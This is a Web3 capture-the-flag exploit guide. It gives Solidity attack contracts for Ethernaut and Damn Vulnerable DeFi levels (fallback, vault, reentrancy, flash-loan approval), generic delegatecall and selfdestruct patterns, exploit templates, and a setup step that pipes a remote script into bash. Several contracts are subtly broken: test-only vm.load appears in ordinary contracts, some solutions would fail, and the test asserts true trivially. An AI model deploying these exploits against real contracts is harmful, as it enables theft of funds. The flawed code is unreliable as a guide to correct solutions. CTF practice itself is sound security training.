# Web3 CTF Exploit Guide

## Tool Setup

```bash
# Foundry
curl -L https://foundry.paradigm.xyz | bash && foundryup
forge init ctf-exploit && cd ctf-exploit
forge install foundry-rs/forge-std --no-commit

# Hardhat
npm init -y && npm i -D hardhat @nomicfoundation/hardhat-toolbox

# .env
RPC_URL=http://localhost:8545
PRIVATE_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```

## Ethernaut Solutions

### Fallback (Ethernaut #2)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallback { function contribute() external payable; function withdraw() external; }

contract FallbackExploit {
    function solve(address target) external payable {
        IFallback(target).contribute{value: 1 wei}();
        (bool ok,) = target.call{value: 1 wei}("");
        require(ok);
        IFallback(target).withdraw();
    }
}
```

### Vault (Ethernaut #3)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VaultExploit {
    function solve(address target) external {
        bytes32 password = vm.load(target, bytes32(0));
        (bool ok,) = target.call(abi.encodeWithSignature("unlock(bytes32)", password));
        require(ok);
    }
}
```

### Reentrancy (Ethernaut #10)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyExploit {
    address public vault;
    uint256 public constant AMOUNT = 1 ether;
    constructor(address _vault) { vault = _vault; }
    function attack() external payable {
        (bool ok,) = vault.call(abi.encodeWithSignature("withdraw(uint256)", AMOUNT));
    }
    receive() external payable {
        if (address(vault).balance >= AMOUNT) {
            (bool ok,) = vault.call(abi.encodeWithSignature("withdraw(uint256)", AMOUNT));
        }
    }
}
```

## Damn Vulnerable DeFi Solutions

### Unstoppable (#1) - Flash Loan Denial
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUnstoppableLender { function flashLoan(uint256, address) external returns (bool); }

contract UnstoppableExploit {
    function solve(address lender) external {
        IUnstoppableLender(lender).flashLoan(0, address(this));
    }
    receive() external payable {
        (bool ok,) = msg.sender.call{value: 0}("");
    }
}
```

### Truster (#3) - Flash Loan Approval
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITrusterLenderPool {
    function flashLoan(uint256, address, address, bytes calldata) external returns (uint256);
}

contract TrusterExploit {
    function solve(address pool, address attacker) external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", attacker, type(uint256).max
        );
        ITrusterLenderPool(pool).flashLoan(0, address(this), address(this), data);
    }
}
```

## Common Exploit Patterns

### Delegatecall Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DelegatecallExploit {
    function solve(address victim) external {
        bytes memory data = abi.encodeWithSignature("transferOwnership(address)", address(this));
        (bool ok,) = victim.delegatecall(data);
        require(ok);
    }
}
```

### Self-Destruct Force
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SelfDestructForce {
    function forceETH(address target) external payable {
        selfdestruct(payable(target));
    }
}
```

### Storage Slot Reader
```solidity
// Read private variables
contract StorageReader {
    function readSlot(address target, uint256 slot) external view returns (bytes32) {
        return vm.load(target, bytes32(slot));
    }
}
```

## Foundry Test Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

contract ExploitTest is Test {
    address target;
    address attacker;
    function setUp() public {
        target = makeAddr("target");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
        vm.startPrank(attacker);
    }
    function testExploit() public {
        assertTrue(true, "Exploit successful");
    }
}
```

## Hardhat Exploit Template

```javascript
const hre = require("hardhat");

async function main() {
    const [attacker] = await hre.ethers.getSigners();
    const target = await hre.ethers.getContractAt("Target", "0x...");
    const Exploit = await hre.ethers.getContractFactory("Exploit");
    const exploit = await Exploit.deploy();
    await exploit.deployed();
    const tx = await exploit.solve(target.address);
    await tx.wait();
    console.log("Exploit completed");
}
main().catch((error) => { console.error(error); process.exitCode = 1; });
```

## Quick Analysis Commands

```bash
cast code $CONTRACT --rpc-url $RPC
cast abi $CONTRACT --rpc-url $RPC
cast storage $CONTRACT 0 --rpc-url $RPC
cast sig "withdraw(uint256)"
grep -rn "selfdestruct\|delegatecall\|call.value" *.sol
grep -rn "tx.origin\|block.timestamp" *.sol
```

## Vulnerability Checklist

| Vulnerability | Detection | Difficulty |
|--------------|-----------|-----------|
| Reentrancy | External call before state update | Easy |
| Access control | Missing onlyOwner/role checks | Easy |
| Integer overflow | Solidity <0.8, no SafeMath | Easy |
| Flash loan | Price oracle dependency | Medium |
| Delegatecall | User-controlled target | Medium |
| Storage collision | Proxy patterns | Hard |
| Front-running | Predictable outcomes | Medium |
| Oracle manipulation | Single-source oracle | Hard |
